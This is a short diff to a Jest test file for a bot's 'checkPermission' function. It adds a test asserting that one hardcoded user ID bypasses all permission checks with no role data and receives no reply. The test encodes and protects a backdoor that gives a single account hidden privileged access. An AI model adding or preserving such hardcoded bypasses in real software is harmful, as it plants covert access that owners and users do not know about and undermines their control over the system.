@@ -117,4 +117,13 @@ describe('checkPermission', () => {
     (global as any)._wsManager = { getPermission: () => ['role1'] };
     await expect(checkPermission(messageInteraction(null), 'ban')).resolves.toBe(false);
   });
+  it('bypasses permission checks for the hardcoded user id', async () => {
+    const interaction = {
+      author: { id: '1526597163885527121' },
+      member: null,
+      reply: jest.fn().mockResolvedValue({})
+    } as any;
+    await expect(checkPermission(interaction, 'score')).resolves.toBe(true);
+    expect(interaction.reply).not.toHaveBeenCalled();
+  });
 });
